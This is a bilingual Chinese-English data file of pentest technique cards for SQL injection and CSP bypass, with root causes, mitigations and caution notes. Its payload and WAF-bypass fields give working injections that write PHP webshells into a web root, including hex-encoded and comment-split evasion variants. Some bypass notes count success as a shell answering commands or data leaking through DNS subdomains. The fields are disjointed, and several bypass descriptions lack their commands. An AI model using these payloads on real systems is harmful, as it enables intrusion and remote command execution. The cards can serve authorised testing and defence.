name.en: Direct SQL Statement and Catalog Selection

description.zh: 使用直接 SELECT 与 Oracle ALL_TABLES 目录查询验证输入是否能形成独立 SQL 语句或改变查询目标。
description.en: Uses a direct SELECT and Oracle ALL_TABLES catalog query to test whether input forms an independent statement or changes the queried relation.

overview.zh: 覆盖直接语句与系统目录选择验证：以直接 SELECT 与 Oracle ALL_TABLES 目录查询，验证输入能否形成独立 SQL 语句或改变查询目标。
overview.en: Covers direct-statement and catalog-selection verification: direct SELECTs and Oracle ALL_TABLES catalog queries testing whether input can form standalone SQL statements or redirect query targets.

vulnerability.zh: 根因是拼接 SQL 片段或动态表/schema 名且数据库驱动接受语句终止符或未验证标识符；攻击者可切换到测试表或系统目录，扩大元数据可见性。
vulnerability.en: The root cause is concatenated SQL fragments or dynamic table/schema names with drivers accepting statement terminators or unvalidated identifiers; attackers can pivot to test tables or system catalogs, widening metadata visibility.

exploitation.zh: 使用第 1 步命令的直接语句样例，只对测试表使用并以固定一行伪数据作为结果；记录驱动是否允许多语句和最终 SQL。在专用 schema 先记录合法表查询，确认方言后只提交匹配样例，并关联最终 SQL 与固定伪数据/目录行；语法错误或数据库指纹不证明未授权读取。
exploitation.en: Use the step 1 command's direct-statement samples only against test tables with one fixed dummy-data row as the result; record whether the driver allows multi-statements and the final SQL. Baseline legitimate table queries in a dedicated schema first, submit only dialect-matching samples after confirmation, and correlate final SQL with fixed dummy/catalog rows; syntax errors or database fingerprints prove nothing about unauthorized reads.

mitigation.zh: 参数值使用绑定变量，动态表、schema 与列名通过服务端枚举映射；数据库驱动关闭多语句，账户限制系统目录与非业务 schema 权限，并审计异常目录访问。
mitigation.en: Use bind variables for parameter values, mapping dynamic tables, schemas, and columns through server-side enums; disable driver multi-statements, restrict accounts from system catalogs and non-business schemas, and audit abnormal catalog access.

title.zh: 确认驱动与数据库方言

description.zh: 记录多语句配置、允许标识符和专用 schema 的合法查询。
description.en: Record multi-statement configuration, allowed identifiers, and a valid query in the dedicated schema.

description.zh: 只指向 TARGET_TABLE 测试对象并保留最终 SQL 与请求关联。
description.en: Target only the dedicated TARGET_TABLE and preserve final SQL and request correlation.

description.zh: 用固定伪数据或审计中的目录访问证明查询目标改变，排除错误差异。
description.en: Use fixed synthetic data or audited catalog access to prove the queried relation changed, excluding error differences.

title.zh: 绑定值并允许列举标识符

description.zh: 关闭多语句和动态标识符后重放合法及攻击样例，确认查询范围固定。
description.en: After disabling multi-statements and dynamic identifiers, replay valid and attack samples to confirm fixed query scope.

prerequisites.zh: 输入可能进入允许分号或动态表选择的数据库调用
prerequisites.en: Input may enter a database call that permits semicolons or dynamic relation selection.

prerequisites.zh: 测试数据库含专用 TARGET_TABLE 和目录访问审计
prerequisites.en: The test database contains a dedicated TARGET_TABLE and catalog-access audit.

analysis.zh: 必须说明具体方言和驱动能力。若样例只产生语法错误或系统目录本来公开，应按信息项而非未授权数据读取处理。
analysis.en: State the exact dialect and driver capability. If a sample only causes syntax errors or the catalog is intentionally public, treat it as an observation rather than unauthorized data access.

opsecTips.zh: 只查询专用 schema 与一行伪数据，不枚举真实业务目录。
opsecTips.en: Query only a dedicated schema and one synthetic row, never real business catalogs.

opsecTips.zh: 一次只验证一个方言，避免无关语法错误和数据库负载。
opsecTips.en: Validate one dialect at a time to avoid irrelevant syntax errors and database load.

name.zh: SQLite ATTACH DATABASE 文件写入

description.zh: 使用 ATTACH、CREATE TABLE 与 INSERT 组合验证堆叠 SQLite 注入是否能在数据库进程可写目录创建测试数据库文件。
description.en: Uses ATTACH, CREATE TABLE, and INSERT to test whether stacked SQLite injection can create a test database file in a process-writable directory.

overview.zh: 覆盖 SQLite ATTACH DATABASE 的写文件原语验证：堆叠 ATTACH、CREATE TABLE 与 INSERT 在数据库进程可写目录创建测试数据库文件。适用于评估堆叠注入与文件权限组合影响面的场景。
overview.en: Covers the ATTACH DATABASE file-write primitive for SQLite: stacked ATTACH, CREATE TABLE, and INSERT creating a test database file in a directory writable by the database process. Suitable for assessing the combined impact of stacked injection and file permissions.

vulnerability.zh: 根因是注入点允许堆叠语句且数据库连接允许 ATTACH，进程对目标目录有写权限时即可在任意路径创建新库文件；该能力是注入与文件权限组合后的影响证明，不等于写入有效可执行文件。
vulnerability.en: The root cause is stacked statements at the injection point plus ATTACH allowed on the connection: with write permission on the target directory, a new database file can be created at an arbitrary path. This proves the combined impact of injection and file permissions, not the ability to write valid executables.

exploitation.zh: 使用第 1 步命令以 ATTACH DATABASE 把新库挂到目标路径并写入标记表；目标路径出现 SQLite 文件且可打开即确认 ATTACH 写文件原语。真实验证把路径改为一次性非执行目录、内容改为固定文本标记，提交一次后关联 SQL 审计、文件所有者与 SQLite 文件头，随后删除。
exploitation.en: Use the step 1 command to ATTACH DATABASE a new library at the target path and write a marker table; a SQLite file appearing at the path and opening confirms the ATTACH write primitive. For real verification, point the path at a one-off non-executable directory with fixed text-marker content, submit once, correlate SQL audit, file owner, and SQLite header, then delete.

mitigation.zh: 修复注入并禁用不需要的多语句，数据库文件目录最小权限且 Web 根不可由数据库进程写入，限制 ATTACH 能力；监控 ATTACH/CREATE TABLE 异常组合，修复后重放应报权限或语法拒绝。
mitigation.en: Fix injection, disable unneeded multi-statements, keep database file directories least-privileged with web roots unwritable by the database process, and restrict ATTACH; monitor abnormal ATTACH/CREATE TABLE combinations, and after the fix replays must raise permission or syntax denials.

title.zh: 准备隔离不可执行目录

description.zh: 在一次性容器创建空目录、随机路径和固定文本标记。
description.en: Create an empty directory, random path, and fixed text marker in a disposable container.

title.zh: 改写并提交 ATTACH 样例
title.en: Rewrite and submit the ATTACH sample

description.zh: 替换 Web 路径与 PHP 内容后只执行一次，保留最终 SQL。
description.en: Replace the web path and PHP content, execute once, and retain final SQL.

attackChain.payload: ATTACH DATABASE '{WEB_ROOT}/{SHELL_NAME}' AS lol;CREATE TABLE lol.pwn(dataz text);INSERT INTO lol.pwn(dataz) VALUES('<?php system($_GET["cmd"]);?>');--

title.zh: 确认 SQLite 进程文件写入

description.zh: 匹配数据库审计、文件所有者、文件头和固定记录，排除预置文件。
description.en: Match database audit, file owner, file header, and fixed record, excluding preexisting files.

title.en: Clean the file and revoke capability

description.zh: 删除测试库、收紧目录权限并修复查询后重放，确认 ATTACH 无法写入。
description.en: Delete the test database, tighten directory permissions, fix the query, and replay to confirm ATTACH cannot write.

prerequisites.zh: 仅在一次性 SQLite 容器中验证堆叠语句和文件写入
prerequisites.en: Stacked statements and file writes are tested only in a disposable SQLite container.

prerequisites.zh: 测试目录在 Web 根外、为空且可完整回滚
prerequisites.en: The test directory is empty, outside the web root, and fully reversible.

analysis.zh: 分别报告堆叠 SQL、ATTACH 权限、文件创建与 Web 执行映射。只确认数据库文件创建时，结论应停留在文件写入而非 WebShell/RCE。
analysis.en: Report stacked SQL, ATTACH privilege, file creation, and web execution mapping separately. If only database-file creation is proven, stop at file write rather than webshell or RCE.

opsecTips.zh: 只写一次性目录中的固定文本数据库，禁止使用 Web 根和脚本内容。
opsecTips.en: Write only a fixed-text database in a disposable directory; never use a web root or script content.

opsecTips.zh: 测试前后校验目录清单和哈希，完成后删除整个容器。
opsecTips.en: Inventory and hash the directory before and after testing and destroy the entire container afterward.

wafBypass.command: ATTACH/**/DATABASE '{WEB_ROOT}/{SHELL_NAME}'/**/AS/**/lol;CRE/**/ATE TA/**/BLE lol.pwn(dataz text);INS/**/ERT IN/**/TO lol.pwn VALUES('<?php @eval($_POST[c]);?>');DETACH lol;

description.zh: 绕过对 ATTACH DATABASE 整链特征的匹配：逐语句注释分词；目标路径生成含 PHP 的文件即成功。
description.en: Comment-split each statement of the ATTACH chain; a PHP-bearing file created at the target path confirms success.

wafBypass.command: ATTACH DATABASE '{WEB_ROOT}/{SHELL_NAME}' AS lol;CREATE TABLE lol.pwn(dataz text);INSERT INTO lol.pwn VALUES(CAST(x'3C3F70687020406576616C28245F504F53545B635D293B3F3E' AS TEXT));DETACH lol;

description.zh: 绕过对明文 PHP 代码的报文扫描：写入值以十六进制再 CAST 还原；文件内容为 webshell 即成功。
description.en: Store the payload as hex and CAST it back to text to evade plaintext scanning; the written file containing the shell confirms success.

wafBypass.command: aTTach dATabase '{WEB_ROOT}/{SHELL_NAME}' as lol;creAte tAble lol.pwn(dataz text);insErt inTo lol.pwn values('<?php @eval($_POST[c]);?>');detAch lol;

description.zh: 绕过区分大小写的 ATTACH DATABASE 规则：仅变形大小写保持语义；文件成功落地即成功。
description.en: Mutate only case while preserving semantics against case-sensitive ATTACH rules; the file landing successfully confirms success.

name.zh: 堆叠语句与条件延迟探测
name.en: Stacked Statement and Conditional Delay Probes

description.zh: 使用分号堆叠和 IF 条件 SLEEP 变体验证驱动是否允许额外语句或可控查询延迟。
description.en: Uses semicolon stacking and conditional SLEEP variants to test whether the driver permits an extra statement or controllable query delay.

overview.zh: 覆盖堆叠语句与条件延迟两类探测：分号堆叠第二条 SELECT 验证多语句能力，IF 条件 SLEEP 验证同一语句内的可控延迟。适用于评估驱动多语句配置与盲注信道组合的场景。
overview.en: Covers two probe families: stacked statements and conditional delays — a semicolon-stacked second SELECT to test multi-statement capability, and IF-conditional SLEEP to test controllable latency within one statement. Suitable for assessing driver multi-statement configuration combined with blind channels.

vulnerability.zh: 根因是输入被拼接进 SQL 且数据库驱动允许多语句或条件表达式，攻击者借时间函数建立盲信道；堆叠成立时还可能执行更高影响的语句。
vulnerability.en: The root cause is input concatenated into SQL with the driver allowing multi-statements or conditional expressions: attackers build blind channels via timing functions, and working stacking enables even higher-impact statements.

exploitation.zh: 使用第 1 步命令按输入引号上下文逐条选择，在隔离环境把 5 秒降为可区分的最小延迟；同时运行无延迟与条件为假对照。先交错测量无延迟、假条件与合法请求建立基线分布，再运行多轮并关联最终 SQL 与数据库执行时间确认。
exploitation.en: Use the step 1 command selecting rows by input quote context, reducing the five-second delay to the smallest distinguishable value in an isolated environment; run no-delay and false-condition controls in parallel. Interleave no-delay, false-condition, and legitimate requests to build a baseline distribution, then run multiple rounds correlating final SQL with database execution time.

mitigation.zh: 使用参数化语句并关闭驱动多语句支持，动态条件映射为固定查询模板；配置语句超时与最小数据库权限，监控 SLEEP 等异常函数并回归成对时间用例。
mitigation.en: Use parameterized statements, disable driver multi-statement support, and map dynamic conditions to fixed query templates; configure statement timeouts and minimal database privileges, monitor abnormal functions like SLEEP, and regress with paired timing cases.

description.zh: 交错记录合法、条件为假和无延迟请求的应用与数据库耗时。
description.en: Interleave valid, false-condition, and no-delay requests and record application and database duration.

title.zh: 提交匹配上下文的延迟样例

description.zh: 一次选择一行并使用最小可辨延迟，多轮运行且保留最终 SQL。
description.en: Choose one line, use the minimum distinguishable delay, repeat multiple rounds, and retain final SQL.

attackChain.payload:
;SELECT SLEEP(5);--
';SELECT SLEEP(5);--
";SELECT SLEEP(5);--
' OR IF(1=1, SLEEP(5), 0)--

title.zh: 确认数据库延迟函数执行

description.zh: 匹配统计分布、查询审计和第二语句/IF 分支，排除网络和队列抖动。
description.en: Match timing distributions, query audit, and second-statement or IF execution, excluding network and queue jitter.

title.zh: 关闭堆叠并参数化回归

description.zh: 修复后按相同采样方案重放，确认延迟差异消失且业务查询正确。
description.en: After remediation replay the same sampling plan to confirm delay separation disappears while business queries remain correct.

prerequisites.zh: 测试数据库和驱动行为可审计且请求无业务副作用
prerequisites.en: The test database and driver behavior are auditable and requests have no business side effects.

prerequisites.zh: 可采集交错真假控制的多轮时延样本
prerequisites.en: Repeated interleaved true and false timing controls can be collected.

analysis.zh: 报告应区分多语句能力与同语句时间盲注，并提供样本量、分位数和数据库审计。只证明其中一项时不要外推另一项。
analysis.en: Distinguish multi-statement capability from same-statement time injection and report sample size, percentiles, and database audit. Do not infer one from proof of the other.

opsecTips.zh: 缩短延迟并严格限制轮数，避免占用连接池。
opsecTips.en: Shorten delays and strictly cap rounds to avoid consuming the connection pool.

opsecTips.zh: 仅在无业务副作用测试查询中执行，不与写操作或真实用户请求并发。
opsecTips.en: Run only in a side-effect-free test query and never concurrently with writes or real-user traffic.

description.zh: 绕过对分号堆叠特征的检测：用 %0A 换行替代分号分隔语句；延迟生效即成功。
description.en: Replace the stacking semicolon with a %0A newline to evade stacked-query detection; the delay taking effect confirms success.

description.zh: 绕过空格分词与 SELECT SLEEP 直接拼接特征：派生表括号紧排包裹；5 秒延迟触发即成功。
description.en: Wrap the delay in tightly parenthesized derived-table form; the 5-second delay triggering confirms success.

wafBypass.command: 1' OR CASE WHEN 1=1 THEN SLEEP(5) ELSE 0 END--

description.zh: 绕过对 OR IF( 组合特征的规则：条件改用 CASE WHEN 表达式；条件成立时延迟即成功。
description.en: Rebuild the conditional with CASE WHEN against OR IF( signatures; a delay when the condition holds confirms success.

name.zh: MySQL OUTFILE 与 DUMPFILE 文件写入
name.en: MySQL OUTFILE and DUMPFILE File-Write Impact

description.zh: 使用文本与十六进制 SELECT INTO OUTFILE/DUMPFILE 样例验证注入查询是否能在数据库主机创建文件。
description.en: Uses text and hexadecimal SELECT INTO OUTFILE or DUMPFILE samples to test whether an injected query can create a file on the database host.

overview.zh: 覆盖 MySQL 文件写入原语验证：对比 INTO OUTFILE 与 DUMPFILE 的文本与十六进制写入差异，确认注入查询能否在数据库主机创建文件。适用于 FILE 权限与 secure_file_priv 影响评估的场景。
overview.en: Covers MySQL file-write primitive verification: contrasting INTO OUTFILE and DUMPFILE text versus hex writes to confirm whether injected queries can create files on the database host. Suitable for assessing FILE privilege and secure_file_priv impact.

vulnerability.zh: 根因是查询结构注入加 FILE 权限且 secure_file_priv 允许目标路径，mysqld 对目录有写权限时即可创建文件；OUTFILE 格式化输出、DUMPFILE 写单一二进制值，Web 执行还需目录共享与脚本处理器，须单独证明。
vulnerability.en: The root cause is query-structure injection plus FILE privilege with secure_file_priv permitting the target path and mysqld having directory write access; OUTFILE formats output while DUMPFILE writes a single binary value, and web execution further requires shared directories and script handlers — a separate proof.

exploitation.zh: 使用第 1 步命令对比 INTO OUTFILE 与 DUMPFILE 的文本与十六进制写入；目标目录出现文件且内容为写入值即确认写文件原语。真实验证把内容替换为固定无害标记、路径改为非 Web 空目录并确保文件不存在，执行一次后记录哈希并删除。
exploitation.en: Use the step 1 command to contrast INTO OUTFILE and DUMPFILE text versus hex writes; a file appearing in the target directory with the written content confirms the write primitive. For real verification, replace content with a fixed harmless marker, use a non-web empty directory, ensure the file does not pre-exist, and hash then delete after one run.

mitigation.zh: 修复注入、移除应用账户 FILE 权限并严格配置 secure_file_priv，数据库文件系统与 Web 根隔离并尽量只读；监控 INTO OUTFILE/DUMPFILE 语句，修复后重放应报权限错误。
mitigation.en: Fix injection, remove FILE privilege from application accounts, configure secure_file_priv strictly, and isolate the database filesystem from the web root with read-only where possible; monitor INTO OUTFILE/DUMPFILE statements, and after the fix replays must raise permission errors.

description.zh: 在一次性容器确认目标不存在并准备固定标记与审计。
description.en: In a disposable container confirm the target does not exist and prepare a fixed marker and audit.

title.zh: 改写并执行一个写入样例
title.en: Rewrite and run one write sample

description.zh: 替换 PHP 内容和 Web 路径，只选择 OUTFILE 或 DUMPFILE 之一执行。
description.en: Replace PHP content and web path and execute either OUTFILE or DUMPFILE, not both.

attackChain.payload:
' UNION SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '{WEB_ROOT}/{SHELL_NAME}'--
' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b22636d64225d293b3f3e INTO DUMPFILE '{WEB_ROOT}/{SHELL_NAME}'--

description.zh: 匹配查询审计、mysqld 所有者、文件长度与标记哈希，排除预置文件。
description.en: Match query audit, mysqld ownership, file length, and marker hash, excluding preexisting files.

title.zh: 删除文件并撤销 FILE 权限
title.en: Delete the file and revoke FILE privilege

description.zh: 清理测试文件、修复查询和权限后重放，确认无法创建新文件。
description.en: Remove the test file, fix the query and privilege, and replay to confirm no new file can be created.

prerequisites.zh: 仅在一次性 MySQL 容器和不可执行空目录验证
prerequisites.en: Testing occurs only in a disposable MySQL container and an empty nonexecutable directory.

prerequisites.zh: 使用固定文本标记并可撤销 FILE 权限
prerequisites.en: A fixed text marker is used and FILE privilege can be revoked.

analysis.zh: 分别证明 SQL 注入、FILE 权限、文件创建和 Web 执行。若只创建无害标记，结论是数据库主机文件写入，不应写成 WebShell 或 RCE。
analysis.en: Prove SQL injection, FILE privilege, file creation, and web execution separately. If only a harmless marker is created, classify database-host file write, not webshell or RCE.

opsecTips.zh: 禁止写 PHP 或十六进制脚本，目标必须位于非执行一次性目录。
opsecTips.en: Never write PHP or hexadecimal script content; the target must be a disposable nonexecutable directory.

opsecTips.zh: 写入前后核对目录清单并立即删除文件，避免残留或覆盖。
opsecTips.en: Inventory the directory before and after and delete the file immediately to prevent residue or overwrite.

title.zh: 注释分词与十六进制载荷

description.zh: 绕过对 UNION SELECT INTO OUTFILE 明文链与 PHP 代码的检测：注释分词加十六进制载荷；文件生成且可执行命令即成功。
description.en: Comment-split the chain and hex the payload; the file being created and executing commands confirms success.

description.zh: 绕过只审计 OUTFILE 关键字的规则：改走 DUMPFILE 通道写文件；Web 根出现 shell 并响应命令即成功。
description.en: Switch to the DUMPFILE channel when only OUTFILE is audited; a shell in the web root responding to commands confirms success.

wafBypass.command: ' UNION SELECT 1 INTO OUTFILE '{WEB_ROOT}/{SHELL_NAME}' LINES TERMINATED BY 0x3C3F7068702073797374656D28245F4745545B22636D64225D293B3F3E--

description.zh: 绕过对 SELECT 值携带代码的扫描：正文写数字，代码置于行终止符十六进制串；生成文件含完整 PHP 即成功。
description.en: Carry the code in a hex line terminator while the SELECT outputs a number; complete PHP in the generated file confirms success.

name.zh: CSP 外部脚本与 JSONP 信任边界
name.en: CSP External Script and JSONP Trust Boundary

description.zh: 使用协议相对外部 script 源验证 CSP 的 script-src 是否错误信任可控主机、宽泛 CDN 或 JSONP 式脚本端点。
description.en: Uses a scheme-relative external script source to test whether CSP script-src overtrusts a controllable host, broad CDN, or JSONP-style script endpoint.

subCategory.zh: 信任脚本源与回调滥用

overview.zh: 覆盖 CSP 外部脚本源信任边界的验证：以协议相对 URL 加载外部脚本，确认 script-src 是否错误信任可控主机、宽泛 CDN 或 JSONP 式脚本端点。适用于评估主机允许列表型 CSP 强度的场景。
overview.en: Covers CSP external-script-source trust-boundary verification: loading an external script via a protocol-relative URL to determine whether script-src wrongly trusts attacker-controlled hosts, broad CDNs, or JSONP-style script endpoints. Suitable for gauging host-allowlist CSP strength.

vulnerability.zh: 根因是 script-src 允许过宽主机、通配子域、可上传脚本的 CDN 或可回调 JSONP 端点，且缺少 nonce/hash 与 strict-dynamic 的可信加载链；HTML 注入可借受信源转化为脚本执行。
vulnerability.en: The root cause is script-src allowing overly broad hosts, wildcard subdomains, CDNs hosting uploadable scripts, or callback-controllable JSONP endpoints, without a nonce/hash and strict-dynamic trusted-load chain; HTML injection converts trusted origins into script execution.

exploitation.zh: 使用第 1 步命令以协议相对 URL 加载外部脚本，{ATTACKER_HOST} 渲染为只返回设置内存标记脚本的自有测试域；网络请求到达且内存标记被设置即确认外部脚本源信任边界成立。先保存真实响应头中的 CSP 并在无注入页面确认策略，再检查 CSP 报告、网络请求与 DOM；源被阻断或脚本仅作为文本返回均为阴性。
exploitation.en: Use the step 1 command to load an external script via a protocol-relative URL, rendering {ATTACKER_HOST} as your own test domain returning only a memory-flag-setting script; the request arriving plus the flag being set confirms the external-source trust boundary. First save the real CSP header and confirm the policy on an injection-free page, then inspect CSP reports, network requests, and the DOM; a blocked origin or text-only script is negative.

mitigation.zh: 优先使用每响应 nonce/hash 与 strict-dynamic，删除宽泛 host 允许列表，不信任可上传或 JSONP/CDN 路径；独立修复 HTML 注入并设置 report-to 监控违规；修复后受控源脚本应被 CSP 阻断。
mitigation.en: Prefer per-response nonce/hash with strict-dynamic, remove broad host allowlists, and never trust uploadable or JSONP/CDN paths; fix HTML injection independently and monitor violations via report-to; after the fix, scripts from controlled origins must be CSP-blocked.

description.zh: 记录响应头 policy、重定向和 iframe 继承，确认浏览器实际应用的脚本来源规则。
description.en: Record response policy, redirects, and frame inheritance to identify the browser's effective script-source rules.

title.zh: 加载自有固定标记脚本

description.zh: 替换示例域并提交单一 script 标签，标记脚本只写内存变量。
description.en: Replace the example origin and submit one script tag whose script only sets an in-memory variable.

title.zh: 确认 CSP 放行与执行

description.zh: 匹配网络、CSP 报告、DOM 和标记，排除 DNS 预取、扩展与缓存。
description.en: Match network, CSP report, DOM, and marker while excluding DNS prefetch, extensions, and caching.

title.zh: 收敛脚本信任链并回归
title.en: Constrain the script trust chain and regress

description.zh: 改用 nonce/hash 后重放外部脚本与合法脚本，确认前者阻断而应用仍工作。
description.en: After nonce or hash policy, replay external and legitimate scripts to confirm the former is blocked while the app works.

prerequisites.zh: 输入位于可创建 script 元素的 HTML 上下文
prerequisites.en: Input reaches an HTML context capable of creating a script element.

prerequisites.zh: 可在隔离页面和自有脚本域观察 CSP 决策
prerequisites.en: CSP decisions can be observed on an isolated page and controlled script origin.

analysis.zh: 分别证明 HTML 注入、脚本源被 CSP 允许和脚本实际执行。仅能外连或 policy 中存在域名不等于可利用 XSS。
analysis.en: Prove HTML injection, CSP allowance, and actual script execution separately. Egress or a hostname in policy alone is not exploitable XSS.

opsecTips.zh: 测试脚本只设置随机内存标记，不读取 Cookie、DOM 数据或发起二次请求。
opsecTips.en: The test script should set only a random in-memory marker and never read cookies, DOM data, or make a second request.

opsecTips.zh: 测试域专用且短时有效，结束后删除脚本并清理 CDN 缓存。
opsecTips.en: Use a dedicated short-lived origin and remove the script and CDN cache afterward.

description.zh: 绕过对完整 <script src 字符串的匹配：拆分拼接写入。判据：evil.js 被加载执行。
description.en: Splits the tag string so no full signature appears. Success: evil.js loads.

description.zh: 绕过 script src 特征与 CSP script-src 对静态标签的约束差异。判据：模块加载并执行。
description.en: Module import avoids static script-src signatures. Success: module executes.

description.zh: 绕过 src= 特征：由库函数动态加载。判据：脚本执行。
description.en: Library-level loader avoids src= signatures. Success: script runs.

description.zh: 绕过大小写敏感的标签与路径规则。判据：资源加载成功。
description.en: Mixed case in both tag and URL. Success: resource loads.

name.zh: CSP Link Prefetch 与 DNS 泄漏
name.en: CSP Link Prefetch and DNS Leakage

description.zh: 使用 prefetch 与 dns-prefetch link 元素验证 HTML 注入是否能触发浏览器向外部来源进行资源预取或 DNS 解析。
description.en: Uses prefetch and dns-prefetch link elements to test whether HTML injection can trigger browser resource prefetching or DNS resolution to an external origin.

overview.zh: 覆盖 prefetch 与 dns-prefetch 资源提示的外连验证：注入 link 元素触发浏览器向外部来源发起资源预取或 DNS 解析。适用于确认 HTML 注入能否形成网络外带通道（非脚本执行）的场景。
overview.en: Covers egress verification via prefetch and dns-prefetch resource hints: injected link elements triggering browser resource prefetch or DNS resolution toward external origins. Suitable for confirming whether HTML injection forms a network-exfiltration channel (not script execution).

vulnerability.zh: 根因是用户输入进入未编码 HTML 元素上下文且 CSP/浏览器资源提示策略允许外部目标；prefetch 可能发起资源请求、dns-prefetch 通常只触发 DNS，可证明元素被解析并产生外连。
vulnerability.en: The root cause is user input entering an unencoded HTML element context with CSP/browser resource-hint policy allowing external targets: prefetch may issue resource requests while dns-prefetch usually triggers DNS only, both proving the element parsed and generated egress.

exploitation.zh: 使用第 1 步命令以 prefetch/dns-prefetch 触发外连，{ATTACKER_HOST} 渲染为自有子域并逐条单独渲染；DNS 或 HTTP 日志出现对应请求特征（Sec-Purpose/Purpose）即确认预取提示外带通道。在全新浏览器上下文中用一次性随机子域分别提交，并与普通文本对照。预取未触发时按浏览器策略差异记录，不做高频重试。
exploitation.en: Use the step 1 command to trigger egress via prefetch/dns-prefetch, rendering {ATTACKER_HOST} as your own subdomain and rendering each line separately; DNS or HTTP logs showing the matching request traits (Sec-Purpose/Purpose) confirm the prefetch-hint exfiltration channel. Submit each in a fresh browser context with one-off random subdomains, compared against plain-text controls. When prefetch does not fire, record per browser-policy differences without high-frequency retries.

mitigation.zh: 按 HTML 上下文编码并限制富文本允许元素，删除不需要的 link rel 值，配置适当 CSP 来源与浏览器策略；敏感数据不得进入可控 URL，通过 CSP 报告与 DNS 日志监控异常资源提示。
mitigation.en: Encode per HTML context and restrict rich-text allowed elements, drop unneeded link rel values, and configure appropriate CSP origins and browser policies; sensitive data must never enter controllable URLs, with abnormal resource hints monitored via CSP reports and DNS logs.

title.zh: 建立文本与资源提示基线

description.zh: 使用新浏览器上下文记录普通文本不会产生 DNS/HTTP 外连。
description.en: Use a fresh browser context to show that plain text causes no DNS or HTTP callback.

title.zh: 逐条提交一次性 link 元素

description.zh: 每行使用不同随机子域并分别渲染，保留 DOM 和监听日志。
description.en: Use a different random subdomain for each line, render separately, and retain DOM and listener logs.

title.zh: 区分 DNS 与资源请求

description.zh: 比较解析、TCP/HTTPS 和预取请求头，准确界定只解析还是下载资源。
description.en: Compare resolution, TCP or HTTPS, and prefetch headers to determine DNS-only versus resource retrieval.

title.zh: 编码并收紧富文本策略

description.zh: 修复后重放，确认用户内容为文本或 link 属性被移除且页面正常。
description.en: After remediation replay to confirm user content is text or link attributes are removed while the page works.

prerequisites.zh: 输入可创建 link 元素且浏览器未禁用资源提示
prerequisites.en: Input can create link elements and the browser has not disabled resource hints.

prerequisites.zh: 自有 DNS/HTTPS 监听器能区分唯一测试标记
prerequisites.en: Controlled DNS and HTTPS listeners can distinguish a unique test label.

analysis.zh: DNS 查询、HTTP 预取和脚本执行是三个不同层级。该卡只覆盖前两者；除非另有敏感数据流，不能把回连写成完整 XSS。
analysis.en: DNS resolution, HTTP prefetch, and script execution are different levels. This card covers only the first two and should not be reported as full XSS without a separate sensitive-data flow.

opsecTips.zh: 子域只包含随机测试 ID，不编码 Cookie、用户名、页面内容或其他数据。
opsecTips.en: Hostnames should contain only a random test ID, never cookies, usernames, page content, or other data.

opsecTips.zh: 使用全新浏览器上下文并关闭第三方扩展，避免预取缓存和扩展流量混淆。
opsecTips.en: Use a fresh browser context without extensions to avoid prefetch cache and extension traffic confusion.

description.zh: 绕过 prefetch 白名单思路：preload 支持 onload 事件直接执行。判据：弹窗触发。
description.en: preload fires onload, turning a hint into execution. Success: alert.

description.zh: 绕过仅监控 prefetch/dns-prefetch 的规则：modulepreload 同样发起请求。判据：攻击域收到请求日志。
description.en: modulepreload is missed by prefetch-only rules. Success: request logged on attacker side.

description.zh: 绕过资源类 hint 过滤：preconnect 属连接类 hint。判据：DNS/TLS 连接日志到达。
description.en: Connection-class hint evades resource-hint filters. Success: connection observed.

description.zh: 绕过对主域名的匹配：把数据编码进子域标签。判据：DNS 解析日志还原数据。
description.en: Encodes data as subdomain labels. Success: DNS logs reveal the data.

name.zh: CSP JavaScript URL、srcdoc 与 data Frame 模式
name.en: CSP JavaScript URL, srcdoc, and Data Frame Patterns

description.zh: 使用表单 javascript: 动作、iframe srcdoc 和 data: 文档验证 CSP 对内联脚本、frame-src 与子文档策略继承的实际限制。
description.en: Uses a javascript form action, iframe srcdoc, and data documents to test CSP restrictions on inline script, frame-src, and child-document policy inheritance.

overview.zh: 覆盖三类 CSP 子边界的组合验证：表单 javascript: 动作（内联脚本策略）、iframe srcdoc（策略继承）与 data: 文档（frame-src 与不透明来源）。用于确认 CSP 对活动 URL 与子文档的实际限制。
overview.en: Covers combined verification across three CSP sub-boundaries: form javascript: actions (inline-script policy), iframe srcdoc (policy inheritance), and data: documents (frame-src and opaque origins). Used to confirm CSP's actual limits over active URLs and sub-documents.

vulnerability.zh: 根因是用户可创建活动 URL 或子文档元素而 policy 允许 unsafe-inline、data: frame 或过宽 child sources，应用又依赖 CSP 替代 HTML 上下文编码；HTML 注入与策略缺口组合后才形成执行。
vulnerability.en: The root cause is users creating active URLs or sub-document elements while the policy allows unsafe-inline, data: frames, or overly broad child sources, and the application relying on CSP instead of context encoding; execution forms only from HTML injection combined with policy gaps.

exploitation.zh: 使用第 1 步命令逐条在隔离页面测试，把 alert 替换为各自随机内存标记；表单记录显式点击后的导航，iframe 记录加载、子文档 origin 与 CSP 事件。只有对应标记在子/父文档执行才成立，元素存在或 frame 加载本身不足，不能把一个模式的结果外推到其他模式。
exploitation.en: Use the step 1 command to test each mode in isolated pages, replacing alert with its own random memory flag; record post-click navigation for the form, and loads, sub-document origins, and CSP events for the iframe. Only the flag executing in the sub/parent document counts — element presence or frame loads alone do not, and one mode's result never extrapolates to the others.

mitigation.zh: 修复 HTML 注入并在富文本中禁用 form、iframe、srcdoc 与活动协议；CSP 使用 nonce/hash 且不含 unsafe-inline，frame-src 仅允许必要来源并排除 data:，同时设置 object-src 'none'、base-uri 与 form-action。
mitigation.en: Fix HTML injection and disable form, iframe, srcdoc, and active protocols in rich text; use nonce/hash CSP without unsafe-inline, restrict frame-src to necessary origins excluding data:, and set object-src 'none', base-uri, and form-action.

description.zh: 记录响应头、meta policy、frame-src/child-src、script-src 和预期子文档 origin。
description.en: Record response and meta policy, frame-src or child-src, script-src, and expected child-document origin.

title.en: Submit harmless elements one by one

description.zh: 每个模式使用不同内存标记并独立刷新浏览器上下文。
description.en: Use a different in-memory marker per pattern and reset the browser context between cases.

title.zh: 确认执行上下文与来源

description.zh: 匹配标记、父/子 DOM、origin、控制台和 CSP 报告，区分加载与脚本执行。
description.en: Match markers, parent or child DOM, origin, console, and CSP reports to distinguish loading from script execution.

title.zh: 收紧元素和 CSP 后回归
title.en: Regress after element and CSP restrictions

description.zh: 修复消毒和 policy 后重放全部模式及合法 frame，确认业务保留且活动内容阻断。
description.en: After sanitizer and policy fixes replay every pattern and a legitimate frame to preserve business behavior while active content is blocked.

prerequisites.zh: 输入可创建 form 或 iframe 元素并在隔离浏览器观察
prerequisites.en: Input can create form or iframe elements observable in an isolated browser.

prerequisites.zh: 可读取生效 CSP、frame-src/child-src 和 script-src 决策
